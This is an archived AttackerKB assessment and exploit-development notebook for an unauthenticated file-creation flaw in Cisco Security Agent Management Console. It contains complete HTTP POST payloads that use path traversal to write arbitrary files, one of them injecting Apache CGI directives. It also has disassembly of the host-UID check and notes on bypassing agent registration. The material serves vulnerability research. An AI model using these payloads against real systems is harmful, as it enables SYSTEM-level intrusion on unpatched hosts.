---
title: Cisco Security Agent Management Console st_upload File Creation
author: wchen-r7
score: 0
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2011-02-19T01:00:00'
created: '2019-09-12T18:07:53.703187'
revision_date: '2020-02-13T17:12:08.554063'
assessment_id: cd6f254f-254a-4c5d-86c3-0a091af9207c
topic_id: d4fe00e6-d79d-49ae-8dcd-e11786fa5bc7
topic_short_id: OmGFSSDtol
topic_slug: cisco-security-agent-management-console-st-upload-file-creation
akb_topic_url: https://attackerkb.com/topics/OmGFSSDtol/cisco-security-agent-management-console-st-upload-file-creation
akb_assessment_url: https://attackerkb.com/topics/OmGFSSDtol/cisco-security-agent-management-console-st-upload-file-creation#cd6f254f-254a-4c5d-86c3-0a091af9207c
---

# Cisco Security Agent Management Console st_upload File Creation

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/OmGFSSDtol/cisco-security-agent-management-console-st-upload-file-creation#cd6f254f-254a-4c5d-86c3-0a091af9207c).*

---

This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Cisco Security Agent Management Console.  Authentication is not required to exploit this vulnerability.

The flaw exists within the webagent.exe component which is handed requests by an Apache instance that listens by default on TCP port 443.  When handling an st_upload request the process does not properly validate POST parameters used for a file creation. The contents of this newly created file are controllable via another POST variable. A remote attacker can exploit this vulnerability to execute arbitrary code under
the context of the SYSTEM user.

Exploit:

http://downloads.securityfocus.com/vulnerabilities/exploits/46420.py


# Installation

I've done two installations, both in W2003 SP2 (W2003 is the supported
operating system):

* fcs-csamc-hotfix-5.1.0.117-w2k3-k9.zip
* fcs-csamc-hotfix-6.0.0.220-w2k3-k9.zip

Both versions can be easily found in Internet googling by the filename.

# Testing the PoC

The PoC doesn't work for me in 5.1.0.117. Reasons

(1) The path and the parameteres. It can be easily fixed...

PoC request modified to write arbitrary contents to arbitrary file:

```
POST /csamc51/agent HTTP/1.1
Host: localhost
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
Content-type: multipart/form-data; boundary=172.16.240.1.501.72115.1350048178.818.1
Content-Length: 786

--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="host_uid"

F0888900-ACF9-4728-8F20-08B3E5BBA3AD
--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="extension"

/../../../../../../../../../../../../test.txt
--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="jobname"


--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="diagsu"

asdfafdsasdffdasdfsaadfsadsfadsfdafsadsf
asdfasdfadsfadfssdfasd
fsadadfsadsfsdafafsd
--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="host"

1234
--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="profiler"


--172.16.240.1.501.72115.1350048178.818.1--
```

After reversing, other paths can be used to write arbitrary contents to arbitrary files, as sample:

```
POST /csamc51/agent HTTP/1.1
Host: localhost
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
Content-type: multipart/form-data; boundary=172.16.240.1.501.72115.1350048178.818.1
Content-Length: 846

--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="host_uid"

F0888900-ACF9-4728-8F20-08B3E5BBA3AD
--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="extension"

/../../../../../../../../../../../../test.txt
--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="jobname"


--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="diagsu"


--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="diags"


--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="host"

1234
--172.16.240.1.501.72115.1350048178.818.1
Content-Disposition: form-data; name="profiler"

Options +Includes +ExecCGI
AddHandler cgi-script gee
--172.16.240.1.501.72115.1350048178.818.1--
```

(2) the host uid

Its the major reason which makes the PoC fail, the PoC use a hardcoded host uid
to do its requests:

```
_host_uid = 'C087EFAE-05A2-4A0B-9512-E05E5ED84AEB'
```

The host uid identifies a cisco agent and is generated while registration of the
agent with the management console.

Both versions, 5.1.0.117 and 6.0.0.220 check the host uid and doesn't allow
to upload files if it isn't a registered uid:

Version 5.1.0.117

* The host uid fields is read and a pointer stored on host_uid_var_1364:

```
.text:004847F9                 mov     ecx, [ebp+var_1378]
.text:004847FF                 mov     ebx, [ecx]
.text:00484801                 mov     edi, offset aHost_uid ; "host_uid"
.text:00484806                 mov     esi, ebx
.text:00484808                 mov     ecx, 9
.text:0048480D                 xor     edx, edx
.text:0048480F                 repe cmpsb
.text:00484811                 jnz     short loc_48482C
.text:00484813                 mov     eax, [ebp+var_132C]
.text:00484819                 mov     eax, [eax]
.text:0048481B                 call    sub_47AB50
.text:00484820                 mov     [ebp+host_uid_var_1364], eax
.text:00484826                 mov     eax, [ebp+var_132C]
```

* Later the Host ID is checked

```
.text:00484C19 loc_484C19:                             ; CODE XREF: sub_484350+7A3j
.text:00484C19                 lea     eax, [ebp+var_1354]
.text:00484C1F                 push    eax
.text:00484C20                 mov     ecx, [ebp+host_uid_var_1364]
.text:00484C26                 call    check_uid_hostsub_47B7A0 ; check registration of host uid
.text:00484C2B                 add     esp, 4
.text:00484C2E                 test    eax, eax
.text:00484C30                 jz      short loc_484C49 ; if it has been registered
.text:00484C32                 push    offset aHostidIsNotReg ; "Hostid is not registered for upload"
.text:00484C37                 lea     ecx, [ebp+Dest]
.text:00484C3D                 push    ecx             ; Dest
.text:00484C3E                 call    ds:sprintf
.text:00484C44                 jmp     loc_485221
```

Version 6.0.0.220

* Get host uid

```
.text:00489820                 cmp     dword ptr [eax], 0
.text:00489823                 jz      loc_48998A
.text:00489829                 mov     ecx, [ebp+var_137C]
.text:0048982F                 mov     ebx, [ecx]
.text:00489831                 mov     edi, offset aHost_uid ; "host_uid"
.text:00489836                 mov     esi, ebx
.text:00489838                 mov     ecx, 9
.text:0048983D                 xor     edx, edx
.text:0048983F                 repe cmpsb
.text:00489841                 jnz     short loc_48985C
.text:00489843                 mov     eax, [ebp+host_uid_var_132C]
.text:00489849                 mov     eax, [eax]
.text:0048984B                 call    sub_47E760
.text:00489850                 mov     [ebp+var_1368], eax
.text:00489856                 mov     eax, [ebp+host_uid_var_132C]
```

* And check it

```
.text:00489C50
.text:00489C50 loc_489C50:                             ; CODE XREF: sub_489380+7A3j
.text:00489C50                 lea     eax, [ebp+var_1354]
.text:00489C56                 push    eax
.text:00489C57                 mov     ecx, [ebp+var_1368]
.text:00489C5D                 call    sub_47F890
.text:00489C62                 add     esp, 4
.text:00489C65                 test    eax, eax
.text:00489C67                 jz      short loc_489C80
.text:00489C69                 push    offset aHostidIsNotReg ; "Hostid is not registered for upload"
.text:00489C6E                 lea     ecx, [ebp+Dest]
.text:00489C74                 push    ecx             ; Dest
.text:00489C75                 call    ds:sprintf
.text:00489C7B                 jmp     loc_48A272
```


* Solutions

The registration doesn't need authenticaiton (if ACL's hasn't been configured
in the management console, by defalut anyone can register).

Options:

(1) Easy: Provide in the module a HOSTUID option, and give instruction about
how to get a valid HOSTUID, basically the user should install a cisco agent,
configure the management console as the victim, and get the legit HOSTUID which
is saved automatically in the configuration file of the agent.
(2) Hard: Reverse the registrarion process. A little tricky because all the
communications go via SSL... anyway... playing with it!
(3) Check check_uid_hostsub_47B7A0 in case there is a bypass for the check
of the host id

* Who is making the registration??

According to my analysis the registration seems to be done by leventmgr.exe. I've get
a wireshark capture of the supposed registration, and I've the private key for the server,
but I haven't been able to decrypt the ssl traffic with the wireshark capabilities (I configured
the SSL private key... still no success).

The pcap file, and the certificate plus the private key for the server component are attached in the
analysis directory.

Next steps: continue with the reversing of leventmgr.exe

Hooking SSL_read and SSL_write from SSLEAY32 is possible to look at the SSL encrypted communication...

```
02637008  50 4f 53 54 20 2f 63 73-61 6d 63 35 31 2f 61 67  POST /csamc51/ag
02637018  65 6e 74 20 48 54 54 50-2f 31 2e 31 0d 0a 48 6f  ent HTTP/1.1..Ho
02637028  73 74 3a 20 6a 66 65 64-6e 2d 36 65 64 32 64 62  st: jfedn-6ed2db
02637038  36 63 61 38 3a 35 34 30-31 0d 0a 50 72 61 67 6d  6ca8:5401..Pragm
02637048  61 3a 20 6e 6f 2d 63 61-63 68 65 0d 0a 41 63 63  a: no-cache..Acc
02637058  65 70 74 2d 65 6e 63 6f-64 69 6e 67 3a 20 67 7a  ept-encoding: gz
02637068  69 70 0d 0a 43 6f 6e 74-65 6e 74 2d 4c 65 6e 67  ip..Content-Leng
02637078  74 68 3a 20 34 33 32 0d-0a 43 6f 6e 74 65 6e 74  th: 432..Content
02637088  2d 54 79 70 65 3a 20 61-70 70 6c 69 63 61 74 69  -Type: applicati
02637098  6f 6e 2f 78 2d 77 77 77-2d 66 6f 72 6d 2d 75 72  on/x-www-form-ur
026370a8  6c 65 6e 63 6f 64 65 64-0d 0a 0d 0a 0d f0 ad ba  lencoded........
0:035> db 01dbfd39 L1B0
01dbfd39  63 70 61 79 6c 6f 61 64-3d 78 9c 95 51 cb 4e c3  cpayload=x..Q.N.
01dbfd49  30 10 fc 15 5f 2a c1 61-25 32 42 bf 93 c2 29 29  0..._*.a%2B...))
01dbfd59  c9 01 a9 08 a9 15 1c 10-07 27 76 db 40 9a 94 e6  .........'v.@...
01dbfd69  51 54 c4 bf b3 5b 1e 77-64 79 66 34 ab 9d 5d cb  QT...[.wdyf4..].
01dbfd79  17 43 e5 e1 23 4f 73 6b-e2 24 85 79 9c 1b d0 52  .C..#Osk.$.y...R
01dbfd89  25 32 36 10 cf e7 39 58-9d a9 24 cf 52 25 32 35  %26...9X..$.R%25
01dbfd99  4c f4 c9 b6 6d d7 c3 cb-3a f8 06 6c f0 d2 17 b6  L...m...:..l....
01dbfda9  74 31 f3 5d 09 8f 55 e3-db 63 77 b7 9a 48 6e a6  t1.]..U..cw..Hn.
01dbfdb9  72 aa a2 19 47 b9 0c 87-b1 2a 03 aa 7b 57 be 22  r...G....*..{W."
01dbfdc9  49 bc 4f fd f2 19 69 22-e3 ac d9 d4 55 b7 9d c8  I.O...i"....U...
01dbfdd9  19 d9 ef b1 45 5a bb 1d-22 a9 5d eb 43 8d ac a9  ....EZ..".].C...
01dbfde9  a9 eb c3 1e 29 a2 4e c1-a5 5a a4 28 56 6e 73 85  ....).N..Z.(Vns.
01dbfdf9  f4 b0 38 ba 43 25 30 30-43 4d da d3 06 a4 82 42  ..8.C%00CM.....B
01dbfe09  70 04 9c 56 d1 e4 09 09-45 41 31 14 e9 34 01 d9  p..V....EA1..4..
01dbfe19  2a fa 03 2a 14 fc 7b bd-db c1 35 14 ef 4e 6f 43  *..*..{...5..NoC
01dbfe29  38 e1 96 6c 5f f7 ff 7e-ea f5 cf 25 32 42 d9 30  8..l_..~...%2B.0
01dbfe39  40 a6 8c d5 37 c6 02 e7-89 02 21 b5 85 34 8d 24  @...7.....!..4.$
01dbfe49  24 3a b1 2a c2 23 53 ce-da ee 77 06 a5 70 ae 58  $:.*.#S...w..p.X
01dbfe59  bb 73 60 10 25 32 42 90-58 dd 13 16 b5 07 9a cc  .s`.%2B.X.......
01dbfe69  c6 73 6d c4 9a 60 23 b9-42 44 8c fe 49 72 76 a8  .sm..`#.BD..Irv.
01dbfe79  47 74 cb f5 19 7b b7 04-c1 39 bb fc 02 a6 46 85  Gt...{...9....F.
01dbfe89  1c 26 70 61 79 6c 6f 61-64 5f 6c 65 6e 67 74 68  .&payload_length
01dbfe99  3d 34 39 38 26 64 73 74-3d 35 26 61 70 74 79 70  =498&dst=5&aptyp
01dbfea9  65 3d 31 36 26 61 70 76-65 72 73 69 6f 6e 3d 33  e=16&apversion=3
01dbfeb9  26 68 6f 73 74 5f 75 69-64 3d 7b 46 42 46 36 35  &host_uid={FBF65
01dbfec9  38 41 42 2d 43 38 46 35-2d 34 32 32 41 2d 38 43  8AB-C8F5-422A-8C
01dbfed9  43 46 2d 36 34 45 33 41-46 45 42 33 31 35 37 7d  CF-64E3AFEB3157}
```


now would be nice to find a way to clean the client state and get the full communication to
register a new host. Anyway, this cpayload field doesn't look very good.... seems like even
over ssl, the payload while registration messages go encoded... more reversing needed here.
